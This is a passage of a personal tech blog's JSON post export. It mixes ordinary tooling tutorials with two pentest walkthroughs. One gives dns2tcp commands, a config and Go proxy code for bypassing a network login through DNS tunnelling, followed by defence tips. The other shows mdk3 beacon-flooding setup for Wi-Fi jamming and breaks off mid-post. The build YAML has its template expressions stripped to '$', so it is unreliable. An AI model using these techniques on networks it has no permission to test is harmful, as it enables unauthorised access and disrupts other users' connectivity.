command.c_str(), command.length());    std::this_thread::sleep_for(std::chrono::seconds(2));    for (int i = 1; i &lt;= num_inserts; ++i) {        command = \"insert \" + std::to_string(i) + \" name\" + std::to_string(i) + \" \" + std::to_string(i) + \" item\" + std::to_string(i) + \"@data\\n\";        write(fd, command.c_str(), command.length());    }    command = \"exit\\n\";    write(fd, command.c_str(), command.length());    command = \"exit\\n\";    write(fd, command.c_str(), command.length());    auto end_time = std::chrono::high_resolution_clock::now();    auto elapsed_time = std::chrono::duration_cast&lt;std::chrono::seconds&gt;(end_time - start_time);    auto stop_duration = end_time.time_since_epoch();    milliseconds = std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(stop_duration).count();    std::cout &lt;&lt; \"[\" &lt;&lt; milliseconds &lt;&lt; \"]: \";    std::cout &lt;&lt; \"Insert \" &lt;&lt; num_inserts &lt;&lt; \" records, time: \" &lt;&lt; elapsed_time.count() &lt;&lt; \" s\" &lt;&lt; std::endl;    close(fd);    easydb_thread.join();    unlink(pipe_name);    std::cout.rdbuf(coutbuf);    return 0;}The test program will open a pipe then insert 100000 records to the database db, it records the duration time and write to the log time.log. Build the test program with g++:$ g++ test_insert.cpp -o testIn the log file time.log, for example:[timexxxxxxxxxx]: Start insert test[timexxxxxxxxxx]: Insert 100000 records, time: 4 sShellA simple Shell script as an example:#!/bin/basheasydb_path=\"./easydb\"num_inserts=10000mkfifo pipe$easydb_path &lt; pipe &amp;start_time=$(date +%s)echo \"use db\" &gt;&gt; pipefor i in $(seq 1 $num_inserts); do  echo \"insert $i name$i $i item$i@data\" &gt;&gt; pipedoneecho \"exit\" &gt;&gt; pipeecho \"exit\" &gt;&gt; pipewaitend_time=$(date +%s)elapsed_time=$((end_time - start_time))echo \"Insert 100000 records, time: $elapsed_time s\"exec 9&gt;&amp;-rm pipePythonA simple Python script as an example:import subprocessimport timeimport oseasydb_path = \"./easydb\"num_inserts = 10000os.mkfifo(\"pipe\")easydb_process = subprocess.Popen([easydb_path], stdin=open(\"pipe\", \"w\"))start_time = time.time()with open(\"pipe\", \"w\") as f:    f.write(\"use db\\n\")    for i in range(1, num_inserts + 1):        f.write(f\"insert {i} name{i} {i} item{i}@data\\n\")    f.write(\"exit\\n\")    f.write(\"exit\\n\")easydb_process.wait()end_time = time.time()elapsed_time = end_time - start_timeprint(f\"Insert {num_inserts} records, time: {elapsed_time:.2f} s\")os.unlink(\"pipe\")Source CodeGithub: https://github.com/the0cp/db"
  },
  
  {
    "title": "Open-source Thermal Control for Dell G-series",
    "url": "/posts/dell/",
    "categories": "Windows",
    "tags": "Windows, Qt, Python",
    "date": "2024-11-22 00:00:00 +0900",
    





    
    "snippet": "IntroductionAuthor: Alexander BlkThermal Control Center is an open-source alternative to AWCC for Dell G-series. It has a PyQt-based GUI for the WMI Dell thermal control interface.AWCC - “Alienware...",
    "content": "IntroductionAuthor: Alexander BlkThermal Control Center is an open-source alternative to AWCC for Dell G-series. It has a PyQt-based GUI for the WMI Dell thermal control interface.AWCC - “Alienware Control Center” is an app for thermal control that Dell ships with their G-series notebooks.Target PlatformOS: Windows 10/11.Supported models:  Dell G15: 5511, 5515, 5520, 5525, 5530, 5535  Dell Alienware m16 R1  Dell G3 3590May also work on other Dell G15 / Alienware laptops.DownloadSource code: https://github.com/the0cp/tcc-g15Release(.exe): https://github.com/AlexIII/tcc-g15/releases  Liked the app? Don’t forget to leave the project a star ⭐What It Can Do  ✔️ Switch thermal mode between G-mode, Balanced, and Custom  ✔️ Show GPU/CPU temperature and fan speed  ✔️ Semi-manual fan speed control  ✔️ Option to automatically enable G-mode when GPU/CPU temperature reaches critical  ✔️ Support for keyboard G-mode hotkeyWhy AWCC is BAD  ❌ AWCC has no in-program option to enable/disable G-mode  ❌ AWCC manual fan control is broken at this moment  ❌ AWCC is a bulky, slow, and visually noisy app that can’t even handle basic functions  ❌ AWCC is spying on you  ❌ AWCC sometimes randomly crashes and throws crash reportsIf this alternative works out for you, you can safely remove from your PC:  Alieanware CC Components  Alieanware Command Center Suite  Alieanware OC ControlsRun from the Sourcepython3 -m pip install -r ./requirements.txtpython3 src\\tcc-g15.pyContributeOpen Pull Requests: https://github.com/the0cp/tcc-g15/pullsReport the problem by opening an issue"
  },
  
  {
    "title": "Auto Objection - Android Ace Attorney Simulator",
    "url": "/posts/ace/",
    "categories": "Kotlin",
    "tags": "Kotlin, Android",
    "date": "2024-11-15 00:00:00 +0900",
    





    
    "snippet": "Source Code: https://github.com/the0cp/objectionDownloadDownload the latest version(apk): https://github.com/the0cp/objection/releasesUsagePlace the phone flat on the table and knock the desktop, t...",
    "content": "Source Code: https://github.com/the0cp/objectionDownloadDownload the latest version(apk): https://github.com/the0cp/objection/releasesUsagePlace the phone flat on the table and knock the desktop, the App will automatically pop-up the “Objection!” banner.Support Characters  Phoenix Wright  Apollo Justice  Miles Edgeworth  Dhurke Sahdmadhi  Ga’ran Sigatar Khura’in  Godot  Manfred von Karma  Franziska von Karma  Nahyuta Sahdmadhi  Mia Fey  Klavier Gavin  Athena Cykes  Simon Blackquill  Winston PayneSupport Languages  English  Japanese"
  },
  
  {
    "title": "Create Virtual Serial Port in Linux",
    "url": "/posts/vserial/",
    "categories": "Linux",
    "tags": "Linux, Python",
    "date": "2024-11-10 00:00:00 +0900",
    





    
    "snippet": "Virtual serial ports are a logical representation of physical serial ports. These ports do not connect with the serial port. A virtual serial port allows us to emulate a physical serial port, there...",
    "content": "Virtual serial ports are a logical representation of physical serial ports. These ports do not connect with the serial port. A virtual serial port allows us to emulate a physical serial port, thereby removing the requirements of cable and physical communication interface.Additionally, a virtual port allows software packages to communicate with internal memory using the null modem emulator. The null modem emulator is a virtual driver for Linux that enables virtual serial port communication.There are several ways to create a virtual serial port in Linux to test and debug serial communication protocols.socatInstallsocat is usually available by default, but we can still install it manually with apt-get or yum.#Debian-basedsudo apt-get install -y socat# RHEL-basedsudo yum install -y socatCreate Virtual Serial PortFor instance, to create two pseudo terminals with the debug mode on:$ socat -d -d pty,rawer,echo=0 pty,rawer,echo=0The -d -d option prints errors, fatals, warnings and notices. The two pty,rawer,echo=0 create two pseudo terminals under /dev/pts.PythonA python script can create virtual serial ports.Here’s a simple example:import ptyimport osimport select def mkpty():    master1, slave = pty.openpty()    slaveName1 = os.ttyname(slave)    master2, slave = pty.openpty()    slaveName2 = os.ttyname(slave)    print(\"\\ndevice names: \", slaveName1, slaveName2)    return master1, master2 if __name__ == \"__main__\":    master1, master2 = mkpty()    while True:        rl, wl, el = select.select([master1, master2], [], [], 1)        for master in rl:            data = os.read(master, 128)            print(\"read %d data.\" %len(data))            if master == master1:                os.write(master2, data)            else:                os.write(master1, data)"
  },
  
  {
    "title": "Automatically build Aseprite with Github Actions",
    "url": "/posts/aseprite/",
    "categories": "Github",
    "tags": "Github, YAML",
    "date": "2024-11-10 00:00:00 +0900",
    





    
    "snippet": "Aseprite can be downloaded as freeware, (albeit it does not have the ability to save sprites) or purchased on Steam or Itch.io. Aseprite source code and binaries are distributed under EULA, educati...",
    "content": "Aseprite can be downloaded as freeware, (albeit it does not have the ability to save sprites) or purchased on Steam or Itch.io. Aseprite source code and binaries are distributed under EULA, educational, and Steam proprietary licenses.  The EULA permits others to download the Aseprite source code, compile it, and use it for personal purposes, but forbids its redistribution to third parties.We can use Github Actions to automatically fetch Aseprite source code and compile it.Github ActionsGitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that run tests whenever you push a change to your repository, or that deploy merged pull requests to production.  You can simply fork/clone my repository to setup the workflow:$ git clone https://github.com/the0cp/aseprite-auto.gitCreate workflowIn your repository on GitHub, create a workflow file *.yml in the .github/workflows directory.If your repository doesn’t have a .github/workflows directory, go to the main page of the repository on GitHub, click Add file, then click Create new file, and name the file .github/workflows/auto-build.yml (auto-build.yml, for example). This creates the .github and workflows directories and the auto-build.yml file in a single step.YAML CodeCopy the following YAML contents into the auto-build.yml file:name: Build and deploy Asepriteon:  schedule:    - cron: '0 12 * * *'env:  BUILD_TYPE: Release  ACTIONS_ALLOW_UNSECURE_COMMANDS: truejobs:  fetch-aseprite-info:    name: Fetch deps info    runs-on: ubuntu-latest    outputs:      download-link: $      release-tag: $    steps:      - name: Fetch Aseprite release link        id: aseprite-link        uses: a1393323447/fetch-release@main        with:            group: aseprite            repo: aseprite            match: Aseprite-.*?-Source.zip  create-release:    name: Create Release    runs-on: ubuntu-latest    needs: fetch-aseprite-info    permissions:      contents: write    outputs:      download-link: $      release-tag: $    steps:      - uses: actions/checkout@v2      - uses: ncipollo/release-action@v1        with:          tag: $          body: Aseprite-$          skipIfReleaseExists: true          token: $  build-aseprite:    name: Build Aseprite    needs: create-release    permissions:      contents: write    runs-on: $    strategy:        matrix:          os: [ windows-latest, ubuntu-latest, macOS-latest ]        fail-fast: false    steps:      - name: Install dependencies (Windows)        if: matrix.os == 'windows-latest'        uses: seanmiddleditch/gha-setup-ninja@master      - name: Install dependencies (Ubuntu)        if: matrix.os == 'ubuntu-latest'        run: sudo apt-get install -y g++ cmake ninja-build libx11-dev libxcursor-dev libxi-dev libgl1-mesa-dev libfontconfig1-dev      - name: Install dependencies (macOS)        if: matrix.os == 'macOS-latest'        run: brew install ninja p7zip      - name: Fetch Skia release link        id: skia-link        uses: a1393323447/fetch-release@main        with:            group: aseprite            repo: skia            match: Skia-$-Release-x64(-libstdc\\+\\+)?.zip      - name: Download Skia        run: |          curl -o Skia-$-Release-x64.zip -L $          unzip Skia-$-Release-x64.zip -d skia      - name: Download Aseprite release        run: |          curl -o Aseprite-source.zip -L $          unzip Aseprite-source.zip -d aseprite          mkdir -p aseprite/build      - name: Set architecture for the produced binary (Windows)        if: matrix.os == 'windows-latest'        uses: ilammy/msvc-dev-cmd@v1      - name: Setting Visual Studio build environment variables and paths (Windows)        if: matrix.os == 'windows-latest'        uses: seanmiddleditch/gha-setup-vsdevenv@master      - name: Run CMake (Windows)        if: matrix.os == 'windows-latest'        working-directory: aseprite/build        shell: cmd        run: cmake -DCMAKE_BUILD_TYPE=$ -DCMAKE_IGNORE_PATH='C:/ProgramData/chocolatey/bin/;C:/Strawberry/c/bin/' -DLAF_BACKEND=skia -DSKIA_DIR=../../skia -DSKIA_LIBRARY_DIR=../../skia/out/Release-x64 -G Ninja ..      - name: Run CMake (Ubuntu)        if: matrix.os == 'ubuntu-latest'        working-directory: aseprite/build        run: cmake -DCMAKE_BUILD_TYPE=$ -DLAF_BACKEND=skia -DSKIA_DIR=../../skia -DSKIA_LIBRARY_DIR=../../skia/out/Release-x64 -G Ninja ..      - name: Run CMake (macOS)        if: matrix.os == 'macOS-latest'        working-directory: aseprite/build        run: |          cmake -DCMAKE_BUILD_TYPE=$ -DCMAKE_OSX_ARCHITECTURES=x86_64 -DLAF_BACKEND=skia -DSKIA_DIR=../../skia -DSKIA_LIBRARY_DIR=../../skia/out/Release-x64 -G Ninja ..      - name: Run Ninja        working-directory: aseprite/build        run: ninja aseprite      - name: Clean up build        working-directory: aseprite/build/bin        shell: bash        run: rm -f gen modp_b64_gen gen.exe gen.exe.manifest modp_b64_gen.exe modp_b64_gen.exe.manifest      - name: (Windows) Make portable zip        working-directory: aseprite/build/bin        run: echo '# This file is here so Aseprite behaves as a portable program' &gt; aseprite.ini      - name: Create release        working-directory: aseprite/build/bin        run: 7z -tzip a Aseprite-$-$.zip *      - name: Upload release        uses: svenstaro/upload-release-action@v2        with:          repo_token: $          file: aseprite/build/bin/Aseprite-$-$.zip          asset_name: Aseprite-$-$.zip          tag: $The code defaultly build Windows &amp; Linux &amp; OSX version of Aseprite and create a public release. Edit yourself.Viewing workflow resultsOn GitHub, navigate to the main page of the repository. Under your repository name, click Actions.The log shows you how each of the steps was processed. Expand any of the steps to view its details."
  },
  
  {
    "title": "Bypass the Network Authentication with DNS Tunnelling",
    "url": "/posts/dns/",
    "categories": "Pentest",
    "tags": "Linux, Pentest",
    "date": "2024-11-09 00:00:00 +0900",
    





    
    "snippet": "After connecting to a AP, the authentication system will want you to log in to access the Internet.However, in some authentication system, nslookup can still work properly even whithout logging in....",
    "content": "After connecting to a AP, the authentication system will want you to log in to access the Internet.However, in some authentication system, nslookup can still work properly even whithout logging in. Therefore, data through port 53 is not intercepted, and the authentication system can be bypassed using the DNS channel.  Port 53 is the default port for DNS. It is the port most web applications expect to find DNS servers, which they use to translate domains into IP addresses.DNS tunneling is a DNS attack technique that involves encoding the information of other protocols or programs in DNS queries and responses. DNS tunneling generally features data payloads which can latch onto a target DNS server, allowing the attacker to manage applications and the remote server.DNS tunneling tends to rely on the external network connectivity of the compromised system—DNS tunneling needs a way into an internal DNS server that has network access. Attackers also have to control a server and a domain that may function as an authoritative server to carry out data payload executable programs and server-side tunneling.PS C:\\Users\\Admin&gt; nslookup.exe bing.comServer: UnKnownAddress: xx.xxx.xx.xxxNon-authoritative answer:Name: bing.comAddresses: xxxx:xxx:xxx::xxxxx.xxx.xx.xxxxxx.xx.xxx.xxSetup serverWhat we need is a server with public IPv4 address and Linux installed (Debian recommended).root@debian:~# uname -aLinux debian 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64 GNU/LinuxCompile servercd to the directory where you want to store the source code, then ./configure to comnfigure the package for your system. Running it takes a while.make to compile the package. Optionally, type make check to run any self-tests that come with the package.make install to install the programs and any data files and documentation.Configure serverAfter installing, create a config file /etc/dns2tcpd.confroot@debian:~# cat /etc/dns2tcpd.conflisten = 0.0.0.0port = 53user = nobodychroot = /tmpdomain = ns.xxxxx.com   # an NS record whose value is A record's second-level domain nameresources = ssh:127.0.0.1:22Setup clientComplie clientIn Windows, you can use the compiled .exe file.https://github.com/the0cp/dns2tcpRun clientConnect the server with following command, the listening port will be 8888 (It may conflict with some capture services and can be changed to other available ports like 8887 etc.):dns2tcpc -r ssh -z &lt;ns.xxxx.com&gt; &lt;ip&gt; -l 8888Connect the serverInstall and configure ssh on the client. Then establish a connection with 127.0.0.1:8888. On my server, I use root to log in. You can use tools such as puTTY to establish connection and store profiles more conveniently.Port forwarding can be set up to forward 127.0.0.1:22 to 127.0.0.1:10809 (for example) as a SOCKS proxy. Manually add a SOCKS v5 in browsers (e.g. Firefox) to use the proxy.  Of course, you can also use other proxy tools for Global Proxying. (such as Proxifier, proxychains etc.)Connect automatically  For convenience, automated scripts can be developed to achieve functions such as automatic reconnection.I use Golang to develop. As a simple example, part of the source code is as follows:/*main.go*/func main() {\tgo systray.Run(onReady, onExit)\tfmt.Println(banner.Inline(\"dnssh\"))\ts := spinner.New(spinner.CharSets[9], 100*time.Millisecond)\t// Build new spinner\ts.Start() \t// Start the spinner\tpause()\ts.Stop()\tcmd := exec.Command(\"cmd.exe\", \"/c\", \"dns2tcpc.exe -r ssh -z mc.xxxx.com\t000.00.00.00 -l 8888 -d 2\")\tconsole.Debug(\"Opening dns tunnel...\")\tgo cmd.Start()\tconsole.Debug(\"Start Connecting through SSH...\")\tvar auths []ssh.AuthMethod\tif *PASS != \"\" {\t\tauths = append(auths, ssh.Password(*PASS))\t}\tconfig := &amp;ssh.ClientConfig{\t\tUser: \t\t\t \t*USER,\t\tAuth: \t\t\t \tauths,\t\tHostKeyCallback: \tssh.InsecureIgnoreHostKey(),\t}\taddr := fmt.Sprintf(\"%s:%d\", *HOST, 8888)\tconn, err := ssh.Dial(\"tcp\", addr, config)\tif err != nil {\t\tconsole.Warn(\"unable to connect to [%s]: %v\", addr, err)\t}\tdefer conn.Close()\taddr = fmt.Sprintf(\"%s:%d\", \"127.0.0.1\", *PORT)\tl, err := net.Listen(\"tcp\", addr)\t\tif err != nil {\t\tconsole.Warn(\"unable to listen on SOCKS port [%s]: %v\", addr, err)\t}\tdefer l.Close()\tconsole.Debug(\"listening for incoming SOCKS connections on [%s]\\n\", addr)\t\tfor {\t\tc, err := l.Accept()\t\tif err != nil {\t\t\tconsole.Warn(\"failed to accept incoming SOCKS connection: %v\", err)\t\t}\t\tgo handleConn(c.(*net.TCPConn), conn)\t}\tlog.Println(\"waiting for all existing connections to finish\")\tconnections.Wait()\tlog.Println(\"shutting down\")}func handleConn(local *net.TCPConn, dialer Dialer) {\tconnections.Add(1)\tdefer local.Close()\tdefer connections.Done()\t\t// SOCKS does not include a length in the header, so take\t// a punt that each request will be readable in one go.\tbuf := make([]byte, 256)\tn, err := local.Read(buf)\tif err != nil || n &lt; 2 {\t\tlog.Printf(\"[%s] unable to read SOCKS header: %v\", local.RemoteAddr(), err)\t\treturn\t}\tbuf = buf[:n]\tswitch version := buf[0]; version {\t\tcase 4:\t\tswitch command := buf[1]; command {\t\tcase 1:\t\t\tport := binary.BigEndian.Uint16(buf[2:4])\t\t\tip := net.IP(buf[4:8])\t\t\taddr := &amp;net.TCPAddr{IP: ip, Port: int(port)}\t\t\tbuf := buf[8:]\t\t\ti := bytes.Index(buf, []byte{0})\t\t\tif i &lt; 0 {\t\t\t\tlog.Printf(\"[%s] unable to locate SOCKS4 user\", local.RemoteAddr())\t\t\t\treturn\t\t\t}\t\t\tuser := buf[:i]\t\t\tlog.Printf(\"[%s] incoming SOCKS4 TCP/IP stream connection, user=%q, raddr=%s\", local.RemoteAddr(), user, addr)\t\t\tremote, err := dialer.DialTCP(\"tcp4\", local.RemoteAddr().(*net.TCPAddr), addr)\t\t\tif err != nil {\t\t\t\tlog.Printf(\"[%s] unable to connect to remote host: %v\", local.RemoteAddr(), err)\t\t\t\tlocal.Write([]byte{0, 0x5b, 0, 0, 0, 0, 0, 0})\t\t\t\treturn\t\t\t}\t\t\tlocal.Write([]byte{0, 0x5a, 0, 0, 0, 0, 0, 0})\t\t\ttransfer(local, remote)\t\tdefault:\t\t\tlog.Printf(\"[%s] unsupported command, closing connection\", local.RemoteAddr())\t}\t\tcase 5:\t\t\tauthlen, buf := buf[1], buf[2:]\t\t\tauths, buf := buf[:authlen], buf[authlen:]\t\t\tif !bytes.Contains(auths, []byte{0}) {\t\t\t\tlog.Printf(\"[%s] unsuported SOCKS5 authentication method\", local.RemoteAddr())\t\t\t\tlocal.Write([]byte{0x05, 0xff})\t\t\t\treturn\t\t\t}\t\t\tlocal.Write([]byte{0x05, 0x00})\t\t\tbuf = make([]byte, 256)\t\t\tn, err := local.Read(buf)\t\t\tif err != nil {\t\t\t\tlog.Printf(\"[%s] unable to read SOCKS header: %v\", local.RemoteAddr(), err)\t\t\t\treturn\t\t\t}\t\tbuf = buf[:n]\t\tswitch version := buf[0]; version {\t\tcase 5:\t\tswitch command := buf[1]; command {\t\tcase 1:\t\tbuf = buf[3:]\t\tswitch addrtype := buf[0]; addrtype {\t\tcase 1:\t\t\tif len(buf) &lt; 8 {\t\t\t\tlog.Printf(\"[%s] corrupt SOCKS5 TCP/IP stream connection request\", local.RemoteAddr())\t\t\t\tlocal.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t\t\t\treturn\t\t\t}\t\tip := net.IP(buf[1:5])\t\tport := binary.BigEndian.Uint16(buf[5:6])\t\taddr := &amp;net.TCPAddr{IP: ip, Port: int(port)}\t\tlog.Printf(\"[%s] incoming SOCKS5 TCP/IP stream connection, raddr=%s\", local.RemoteAddr(), addr)\t\tremote, err := dialer.DialTCP(\"tcp\", local.RemoteAddr().(*net.TCPAddr), addr)\t\tif err != nil {\t\t\tlog.Printf(\"[%s] unable to connect to remote host: %v\", local.RemoteAddr(), err)\t\t\tlocal.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t\t\treturn\t\t}\t\tlocal.Write([]byte{0x05, 0x00, 0x00, 0x01, ip[0], ip[1], ip[2], ip[3], byte(port &gt;&gt; 8), byte(port)})\t\ttransfer(local, remote)\t\tcase 3:\t\t\taddrlen, buf := buf[1], buf[2:]\t\t\tname, buf := buf[:addrlen], buf[addrlen:]\t\t\tip, err := net.ResolveIPAddr(\"ip\", string(name))\t\t\tif err != nil {\t\t\t\tlog.Printf(\"[%s] unable to resolve IP address: %q, %v\", local.RemoteAddr(), name, err)\t\t\t\tlocal.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t\t\t\treturn\t\t\t}\t\t\tport := binary.BigEndian.Uint16(buf[:2])\t\t\taddr := &amp;net.TCPAddr{IP: ip.IP, Port: int(port)}\t\t\tremote, err := dialer.DialTCP(\"tcp\", local.RemoteAddr().(*net.TCPAddr), addr)\t\t\tif err != nil {\t\t\t\tlog.Printf(\"[%s] unable to connect to remote host: %v\", local.RemoteAddr(), err)\t\t\t\tlocal.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t\t\t\treturn\t\t\t}\t\t\tlocal.Write([]byte{0x05, 0x00, 0x00, 0x01, addr.IP[0], addr.IP[1], addr.IP[2], addr.IP[3], byte(port &gt;&gt; 8), byte(port)})\t\t\ttransfer(local, remote)\t\tdefault:\t\t\tlog.Printf(\"[%s] unsupported SOCKS5 address type: %d\", local.RemoteAddr(), addrtype)\t\t\tlocal.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t}\t\tdefault:\t\t\tlog.Printf(\"[%s] unknown SOCKS5 command: %d\", local.RemoteAddr(), command)\t\t\tlocal.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t}\t\t\tdefault:\t\t\t\tlog.Printf(\"[%s] unnknown version after SOCKS5 handshake: %d\", local.RemoteAddr(), version)\t\t\t\tlocal.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})\t\t}\tdefault:\t\tlog.Printf(\"[%s] unknown SOCKS version: %d\", local.RemoteAddr(), version)\t}}How to defense  Ensuring that there is no unrestricted inbound access to UDP port 53 is critical in protecting your DNS server from unauthorized access and potential attacks. UDP port 53 is used by the DNS protocol to resolve domain names to IP addresses and vice versa. If it is left open and unrestricted, it can be exploited by attackers to redirect users to malicious websites, intercept sensitive information or launch DDoS attacks.Tips:There are several ways to defend against DNS tunnel bypass vulnerabilities. Here are some suggestions:  Understand the risks of exposed port 53 and DNS Security.  Prevent users from frequently querying DNS.  Setting up and managing your own private DNS servers  Disable external DNS requests and only allow trusted DNS server query requests.  Traffic inspection, different DNS tunnels have different traffic characteristics, and most of these kind of traffic can be intercepted.  Educating employees about the risks and signs of DNS tunneling attacks.Monitoring UtilitiesBelow are some utilities that are useful for detecting tunneling attacks:      dnsHunter: A Python module written for MercenaryHuntFramework &amp; Mercenary-Linux.         Reads .pcap files to extract DNS queries and performs geo-lookups, which helps in analyses.        reassemble_dns: A Python tool to read .pcap files and reassemble DNS messages.  "
  },
  
  {
    "title": "Set proxy for CMD/Powershell/Terminal/Git",
    "url": "/posts/proxy/",
    "categories": "Terminal",
    "tags": "Linux, Windows, Terminal, Powershell, git, cmd",
    "date": "2022-07-22 00:00:00 +0900",
    





    
    "snippet": "CMDproxy_type=&lt;protcol&gt;://&lt;username&gt;:&lt;password&gt;@&lt;server&gt;:&lt;port&gt;For examples:set http_proxy=http://127.0.0.1:PORTset https_proxy=http://127.0.0.1:PORTset http_proxy=soc...",
    "content": "CMDproxy_type=&lt;protcol&gt;://&lt;username&gt;:&lt;password&gt;@&lt;server&gt;:&lt;port&gt;For examples:set http_proxy=http://127.0.0.1:PORTset https_proxy=http://127.0.0.1:PORTset http_proxy=socks5://127.0.0.1:PORTset https_proxy=socks5://127.0.0.1:PORT# -v verbose (print errors/warnings while in event loop)# -vv very verbose (also print client commands/reponses)# -vvv extremely verbose (also print internal state transitions)# -k ignore the certificate checkTo clear the proxy:set http_proxy=set https_proxy=PowershellVery similar to cmd, here’s the examples:$Env:http_proxy=\"http://127.0.0.1:PORT\";$Env:https_proxy=\"http://127.0.0.1:PORT\";  Additionally, you can add these lines of command to the Powershell’s profile, the follow command will create and open a new profile. The commands in the profile file will run automatically when Powershell starts.if (!(Test-Path -Path $PROFILE )) { New-Item -Type File -Path $PROFILE -Force }notepad $PROFILETerminalExamples:export http_proxy=\"http://127.0.0.1:PORT/\"export https_proxy=\"https://127.0.0.1:PORT/\"export http_proxy=\"socks5://127.0.0.1:PORT/\"export https_proxy=\"socks5://127.0.0.1:PORT/\"export all_proxy=\"socks5://127.0.0.1:PORT/\"  You can edit your ~./bashrc or ~/.zshrc to easily set proxy in terminals, as an example below:alias setproxy=\"export http_proxy=http://127.0.0.1:PORT/; export https_proxy=http://127.0.0.1:PORT/; echo 'Set proxy successfully'\"alias unsetproxy=\"unset http_proxy; unset https_proxy; echo 'Unset proxy successfully'\"source ~/.bashrc to take effect.Proxychains  Proxychains is a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy.Proxychains-ng, the ng standing for next generation, is an enhanced iteration of the defunct proxychains project. It offers improved functionality and enhanced compatibility.Except in cases where proxychains is more suitable due to limitations, proxychains-ng is generally advised.InstallationProxychains-ng already comes pre-installed in most distributions. You can check by entering the command:proxychains4However Proxychains-ng isn’t installed on distributions like Ubuntu. You can install it with apt.sudo apt updatesudo apt install proxychains4You can install proxychains on Mac OS X with an homebrew. You have to download unofficial brew formula for proxychains4: https://gist.github.com/allenhuang/3792521.git clone git://gist.github.com/3792521.git gist-3792521brew install --HEAD gist-3792521/proxychains4_formula.rb# The default config file will be located in /usr/local/etc/proxychains.confbrew install proxychainsTo run current source code version:git clone https://github.com/haad/proxychains.gitcd proxychains# needs a working C compiler, preferably gcc./configuremakesudo make installConfigure ProxychainsOpen the proxychains configuration file using a text editor.sudo vi /etc/proxychains4.confAdd proxies to the bottom of the file (under [ProxyList]). Ensuring they are in the format of   . If you are using authentication, add these next  .  You can also configure how proxychains uses the list of proxies you’ve provided. These can be dynamic, strict, round-robin, or random chains.      Dynamic Chain: Attempt to use the proxies in the listed order. However, if one fails, it’ll skip it and move on to the next one.        Strict Chain: Every proxy is used in the listed order, from the first to the second, third, and so on. If one proxy fails, the entire connection fails.        Round-Robin Chain: The chained proxies are used circularly to distribute the connection amongst the provided proxies. Each connection request goes to the next one in the list, and once it reaches the end, it starts over again at the beginning.        Random Chain: Selects proxies for each connection in a random order. It does not use the proxies in order and provides a unique path through each listed proxy.  Use ProxychainsFor example, to use proxy with curl, you just need to enter the following command:proxychains4 curlGitSet globally:git config --global http.proxy http://127.0.0.1:PORTgit config --global https.proxy https://127.0.0.1:PORTgit config --global http.https://github.com.proxy socks5://127.0.0.1:PORTgit config --global https.https://github.com.proxy socks5://127.0.0.1:PORTOnly set for Github:git config --global http.https://github.com.proxy https://127.0.0.1:PORTgit config --global https.https://github.com.proxy https://127.0.0.1:PORTUnset proxy:git config --global --unset http.proxygit config --global --unset https.proxyCheck current proxy:git config --global -lYou can write your configurations into .gitconfig:vi ~/.gitconfig[http]proxy = socks5://127.0.0.1:PORTproxy = http://127.0.0.1:PORT [https]proxy = socks5://127.0.0.1:PORTproxy = https://127.0.0.1:PORTTo take effect:git config -l --global"
  },
  
  {
    "title": "Selective jamming attack with mdk3",
    "url": "/posts/mdk3/",
    "categories": "Pentest",
    "tags": "Linux, Pentest",
    "date": "2021-11-20 00:00:00 +0900",
    





    
    "snippet": "Introductionmdk3 is used for stress testing 802.11 networks(wifi). It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- d...",
    "content": "Introductionmdk3 is used for stress testing 802.11 networks(wifi). It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- dos etc…mdk3 Description  MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.MDK3 is a tool that “injects” data into wireless networks. “Injection” is the possibility to send self-made data through the air without being connected or associated to any network or station. MDK3 is used to send valid and invalid packets, which belong to the wireless management and not to regular data connections.Homepage: https://github.com/charlesxsh/mdk3-masterAuthor: ASPj of k2wrlzLicense: GPLv2Purpose  Sends beacon frames to show fake APs at clients. (Beacon Flooding)  Sends authentication frames to all APs found in range. (Authentication DoS)  Kicks everybody found from AP. (Deauthentication / Disassociation Amok)You need  Linux based system.  mdk3 installed  Wireless cardInstall mdk3$sudo apt-get install mdk3If mdk3 is successfully installed, try to run it!┌─[theodore@parrot]─[~]└──╼ $sudo mdk3[sudo] password for theodore: MDK 3.0 v6 - \"Yeah, well, whatever\"by ASPj of k2wrlz, using the osdep library from aircrack-ngAnd with lots of help from the great aircrack-ng community:Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid GajownikTHANK YOU!MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.IMPORTANT: It is your responsibility to make sure you have permission from thenetwork owner before running MDK against it.This code is licenced under the GPLv2Check the wireless card$sudo ifconfigFor me, my card’s name is wlx48022a54bc53, in this article I will use the name wlan0 instead of this.Beacon Flooding  Set the wireless card to Monitor Mode:$sudo airmon-ng start wlan0┌─[theodore@parrot]─[~]└──╼ $sudo airmon-ng start wlx48022a54bc53[sudo] password for theodore: Found 2 processes that could cause trouble.Kill them using 'airmon-ng check kill' before puttingthe card in monitor mode, they will interfere by changing channelsand sometimes putting the interface back in managed mode    PID Name    679 NetworkManager    693 wpa_supplicantPHY Interface Driver  Chipsetphy0 wlx48022a54bc53 rt2800usb Ralink Technology, Corp. RT2870/RT3070Interface wlx48022a54bc53mon is too long for linux so it will be renamed to the old style (wlan#) name.  (mac80211 monitor mode vif enabled on [phy0]wlan0mon  (mac80211 station mode vif disabled for [phy0]wlx48022a54bc53)  (mac80211 monitor mode vif enabled on [phy0]wlan0mon  Create fake APs:$sudo mdk3 wlan0mon b -n WIFI_NAME -t -c 6 -s 80  # after arg `-c` is the channel,# `-s` sets the speed in packets per second 